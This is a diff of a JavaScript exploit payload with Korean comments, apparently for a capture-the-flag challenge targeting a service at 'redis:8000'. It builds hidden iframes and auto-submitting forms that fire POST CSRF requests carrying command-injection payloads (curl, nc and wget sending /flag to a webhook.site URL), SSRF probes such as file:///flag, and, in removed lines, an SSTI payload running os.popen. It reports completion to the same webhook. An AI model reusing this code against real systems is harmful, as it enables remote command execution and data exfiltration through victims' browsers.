@@ -1,78 +1,80 @@
 (async () => {
-    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
+    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3'; // 본인의 웹훅
     const TARGET = 'http://redis:8000';
 
-    // 1. GET 방식 공격 (이미지 태그 - 기존과 동일)
-    // ... (작성하신 코드 그대로 사용) ...
-
-    // 2. [NEW] POST 방식 공격 (Form Auto-Submit CSRF)
-    // 화면이 전환되므로 가장 마지막에 실행해야 합니다.
-    // 하지만 우리는 여러 페이로드를 보내야 하므로, 
-    // '숨겨진 iframe'을 여러 개 만들어서 그 안에서 폼을 제출시킵니다.
-
-    const postPayloads = [
-        // [Command Injection]
+    // 1. 공격 페이로드 구성
+    // [RCE] 명령 실행 시도
+    const rcePayloads = [
         `curl -X POST -d @/flag ${WEBHOOK}`,
-        `cat /flag | nc ${WEBHOOK.replace('https://webhook.site/', '')} 80`, // nc가 있을 수도 있음
-        // [Redis Command] (혹시 진짜 Redis Web Console이라면?)
-        `CONFIG SET dir /app/static`,
-        `slaveof no one`,
-        // [SSTI]
-        `{{ config }}`,
-        `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl -d @/flag ${WEBHOOK}').read() }}`
+        `cat /flag | nc ${WEBHOOK.replace('https://', '')} 80`,
+        `wget --post-file=/flag ${WEBHOOK}`
+    ];
+    
+    // [SSRF] 단순 URL 패치 시도 (만약 이 서비스가 URL을 입력받아 보여주는 서비스라면?)
+    // 웹훅으로 접속하게 하거나, 로컬 파일(file://)을 읽어서 자신의 서버로 보내게 유도
+    const ssrfPayloads = [
+        `file:///flag`,
+        `file:///app/flag`,
+        `http://localhost:5000/flag`, // 봇 기준 로컬호스트
+        WEBHOOK // 그냥 웹훅으로 접속이라도 해봐라
     ];
 
-    const params = ['cmd', 'command', 'q', 'query', 'code', 'search'];
+    // 파라미터 이름 추측 (RCE + SSRF 혼합)
+    const params = ['cmd', 'command', 'exec', 'code', 'q', 'query', 'url', 'link', 'target', 'host'];
 
-    // POST CSRF 함수
-    const triggerPostCSRF = (paramName, payloadValue) => {
+    // 2. POST CSRF 함수 (Form 생성 및 자동 제출)
+    const triggerPost = (param, value) => {
         return new Promise(resolve => {
-            // 1. iframe 생성 (폼 제출이 메인 페이지를 이동시키지 않도록)
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.name = `csrf-frame-${Math.random()}`;
+            iframe.name = `csrf-${Math.random().toString(36).substring(7)}`;
             document.body.appendChild(iframe);
 
-            // 2. Form 생성
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = TARGET + '/'; // 루트 경로로 POST
-            form.target = iframe.name;   // 응답을 iframe에서 받음
+            form.target = iframe.name;
             form.style.display = 'none';
 
-            // 3. Input 생성
             const input = document.createElement('input');
             input.type = 'hidden';
-            input.name = paramName;
-            input.value = payloadValue;
+            input.name = param;
+            input.value = value;
             form.appendChild(input);
 
-            // 4. 제출
             document.body.appendChild(form);
             form.submit();
 
-            // 5. 청소 (메모리 누수 방지 및 딜레이)
+            // 0.3초 딜레이 후 정리 (너무 빠르면 전송 안 됨)
             setTimeout(() => {
                 iframe.remove();
                 form.remove();
                 resolve();
-            }, 500); // 0.5초 간격
+            }, 300);
         });
     };
 
-    // 순차적으로 POST 공격 실행
+    // 3. 공격 실행
+    // RCE 페이로드 발사
     for (const param of params) {
-        for (const payload of postPayloads) {
-            await triggerPostCSRF(param, payload);
+        for (const payload of rcePayloads) {
+            await triggerPost(param, payload);
+        }
+    }
+    
+    // SSRF 페이로드 발사
+    for (const param of params) {
+        for (const payload of ssrfPayloads) {
+            await triggerPost(param, payload);
         }
     }
 
-    // 공격 완료 보고
+    // 4. 완료 보고
     fetch(WEBHOOK, {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify({
-            msg: "POST CSRF Attack Completed",
+            msg: "POST CSRF (RCE + SSRF) Launched",
             target: TARGET,
             location: window.location.href
         })
